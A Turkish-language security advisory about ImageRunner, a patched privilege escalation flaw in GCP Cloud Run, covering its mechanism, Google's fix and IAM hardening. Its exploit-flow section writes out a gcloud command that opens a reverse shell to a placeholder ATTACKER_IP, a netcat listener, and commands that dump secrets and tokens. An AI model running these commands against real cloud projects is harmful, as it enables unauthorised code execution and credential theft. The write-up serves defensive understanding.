# ImageRunner: Privilege Escalation Vulnerability in GCP Cloud Run

> **Keşif Tarihi:** 25 Kasım 2024 (Tenable Research)  
> **Düzeltme Tarihi:** 28 Ocak 2025 (Tam production rollout)  
> **Platform:** Google Cloud Platform — Cloud Run  
> **Saldırı Tipi:** Privilege Escalation → Private Container Image Access + RCE  
> **CVE:** Atanmadı (GCP tarafından "breaking change" olarak ele alındı)  
> **Keşfeden:** Liv Matan, Tenable Research  
> **Durum:** Yamalandı — Zorunlu değişiklik uygulandı

---

## Özet

**ImageRunner**, Google Cloud Platform'un Cloud Run servisinde Tenable Research tarafından keşfedilen privilege escalation güvenlik açığıdır. `run.services.update` ve `iam.serviceAccounts.actAs` izinlerine sahip ancak container registry'ye doğrudan erişimi olmayan bir saldırgan, Cloud Run'ın hizmet ajanını (service agent) kötüye kullanarak:

1. Aynı GCP projesindeki private container image'larına yetkisiz erişim sağlayabilir
2. Bu image'lar içindeki secret'ları çalabilir
3. Container argümanlarına kötü niyetli komutlar enjekte ederek keyfi kod çalıştırabilir

---

## Jenga Konsepti — Bulut Güvenliğinde Birbiri Üzerine İnşa Edilen Riskler

Tenable, ImageRunner'ı "**Jenga**" adını verdiği bir güvenlik açığı mimarisi örneği olarak tanımlar:

```
Jenga Konsepti:
    Bulut sağlayıcıları, servisleri kendi diğer servisleri üzerine inşa eder.
    Bazen "gizli servisler" oluşturulur.
    Bir servis saldırıya uğradığında, üzerine inşa edilmiş diğerleri
    de riski miras alır.

GCP Örneği:
    Cloud Run
        ↓ kullanır
    Service Agent (servis-[PROJE_NUMARASI]@serverless-robot-prod.iam.gserviceaccount.com)
        ↓ erişim sağlar
    Artifact Registry
    
Problem: Service Agent'ın izinleri, deploying kullanıcının
         registry erişiminden bağımsız olarak çalışıyordu
```

---

## Teknik Detaylar

### Güvenlik Açığının Mekanizması

Cloud Run'da yeni bir revision dağıtıldığında:

```
Normal Süreç (Yama SONRASI):
Kullanıcı run.services.update çalıştırır
    → Cloud Run, kullanıcının image'a okuma erişimini DOĞRULAR
    → Erişim yoksa → İşlem reddedilir

Savunmasız Süreç (Yama ÖNCESİ):
Kullanıcı run.services.update çalıştırır
    → Cloud Run, DOĞRULAMA yapmadan devam eder
    → Service Agent (yüksek yetkili) image'ı çeker
    → Kullanıcının registry erişimi KONTROL EDİLMEZ
```

### Gerekli İzinler

```
Saldırgan için gerekli minimum izinler:
├── run.services.update     → Cloud Run revision güncelleme
└── iam.serviceAccounts.actAs → Service account üstlenme

Sahip olunması GEREKMEYEN izinler:
└── artifactregistry.repositories.downloadArtifacts (veya roles/artifactregistry.reader)
```

---

## Exploit Akışı

### Aşama 1: Kurbanın Private Image'ını Tespit Et

```bash
# Mevcut Cloud Run servislerini listele
gcloud run services list --platform managed

# Kullanılan image'ları görüntüle
gcloud run services describe <service-name> \
  --format="value(spec.template.spec.containers[0].image)"
# Çıktı: gcr.io/<proje>/özel-image:tag
```

### Aşama 2: Private Image'a Erişim Sağla

```bash
# Kötü niyetli revision — ncat image'ı ile reverse shell
gcloud run services update <target-service> \
  --image gcr.io/<VICTIM_PROJECT>/private-model:latest \
  --args='["-e", "/bin/bash", "-l", "ATTACKER_IP", "4444"]' \
  --region <region>

# Service Agent, saldırganın erişimi olmayan image'ı çeker
# ve attacker-controlled argümanlarla başlatır
```

### Aşama 3: Reverse Shell ile Secret'ları Çal

```bash
# Saldırganın makinesinde dinle:
nc -lvnp 4444

# Container başladığında bağlantı alınır:
# Secret'ları oku:
cat /run/secrets/*
env | grep -E "(API_KEY|SECRET|PASSWORD|TOKEN)"
cat /app/config/*.yaml
```

---

## Gerçek Saldırı Senaryosu

```
Hedef Ortam: Makine Öğrenmesi Şirketi
─────────────────────────────────────────────────────────
Private Container Image İçeriği:
├── Proprietary AI modeli (milyonlarca dolarlık)
├── Eğitim verisi yolları
├── Database credentials (PostgreSQL, MongoDB)
├── API keys (OpenAI, HuggingFace, AWS)
└── Customer PII erişim token'ları

Saldırganın Başlangıç Erişimi:
└── Compromised developer hesabı (run.services.update iznine sahip)
    ─────────────────────────────────────────────────────────
    
Saldırı Adımları:
1. Developer hesabı ele geçirilir
2. ImageRunner exploit çalıştırılır
3. Private AI model image'ı çekilir ve analiz edilir
4. Tüm secret'lar sızdırılır
5. Saldırgan: AI modeli, müşteri verileri, cloud erişimi
```

---

## Google'ın Yanıtı

### Bildirim Süreci

```
Kasım 2024, son hafta → Google etkilenen proje/klasör/org sahiplerine bildirim gönderdi
28 Ocak 2025         → Düzeltme %100 production'a rollout edildi
```

### Düzeltmenin Özü

```
Yeni Kural (28 Ocak 2025 sonrası):
Cloud Run kaynağı oluşturan veya güncelleyen principal,
container image'larına açık okuma iznine SAHİP OLMALIDIR.

Artifact Registry için:
roles/artifactregistry.reader rolü gereklidir

Eski Container Registry için:
roles/storage.objectViewer rolü gereklidir
```

---

## Etkilenen Durumlar

| Senaryo | Risk |
|---------|------|
| Developer'lar `run.services.update`'e sahip ancak registry erişimi yok | **Yüksek** |
| CI/CD pipeline hesapları fazla dar kapsam | **Orta** |
| 3. taraf entegrasyon servisleri | **Değişken** |

---

## Düzeltme Sonrası Doğrulama

```bash
# IAM yapılandırmanızı doğrulayın
# Cloud Run'a deploy eden her kimliğin registry okuma iznine sahip olduğunu kontrol edin:

gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --format="table(bindings.role,bindings.members)" \
  | grep -E "(run|artifactregistry)"

# Service Account için:
gcloud iam service-accounts get-iam-policy <sa-email>
```

---

## Proaktif Güvenlik Önlemleri

### IAM En İyi Pratikleri

```bash
# Cloud Run için minimum gerekli izinler
gcloud projects add-iam-policy-binding <project> \
  --member="serviceAccount:<deployer-sa>@<project>.iam.gserviceaccount.com" \
  --role="roles/run.developer"

# Artifact Registry okuma izni (ImageRunner'dan sonra artık zorunlu)
gcloud artifacts repositories add-iam-policy-binding <repo> \
  --location=<location> \
  --member="serviceAccount:<deployer-sa>@<project>.iam.gserviceaccount.com" \
  --role="roles/artifactregistry.reader"
```

### Cloud Run Revision Güncellemelerini İzleme

```bash
# Audit log'lardan anormal revision güncellemelerini tespit et
gcloud logging read \
  'resource.type="cloud_run_revision" AND 
   protoPayload.methodName="google.cloud.run.v1.Services.ReplaceService"' \
  --limit=50 \
  --format="table(timestamp,protoPayload.authenticationInfo.principalEmail,
                  resource.labels.service_name)"
```

---

## Kaynaklar

- [Tenable Research — ImageRunner](https://www.tenable.com/blog/imagerunner-a-privilege-escalation-vulnerability-impacting-gcp-cloud-run)
- [The Hacker News Analizi](https://thehackernews.com/2025/04/google-fixed-cloud-run-vulnerability.html)
- [CloudVulnDB](https://www.cloudvulndb.org/imagerunner)
- [GCP Cloud Run Release Notes](https://cloud.google.com/run/docs/release-notes)

---

*© 2025 AltHack Security — Gerçek Dünya Siber Güvenlik İstihbaratı*
